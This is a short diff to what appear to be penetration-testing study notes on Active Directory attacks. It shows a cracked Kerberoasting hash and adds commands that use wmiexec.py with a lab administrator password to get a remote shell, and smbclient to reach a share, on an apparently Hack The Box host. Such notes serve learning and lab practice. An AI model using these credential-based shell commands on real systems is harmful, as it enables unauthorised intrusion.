@@ -51,3 +51,12 @@
   ```
   $krb5tgs$23$*SQLService$MARVEL.LOCAL$HYDRA-DC/SQLService.MARVEL.local~60111*$eb6[STRIPPED]6bc:MYpassword123#
   ```
+- After getting a password, we could connect to an smbshare or get a shell
+
+  ```
+  python3 wmiexec.py active.htb/administrator:Ticketmaster1968@10.10.10.100
+  ```
+  or
+  ```
+  smbclient \\\\10.10.10.100\\Users -U active.htb\\Administrator
+  ```
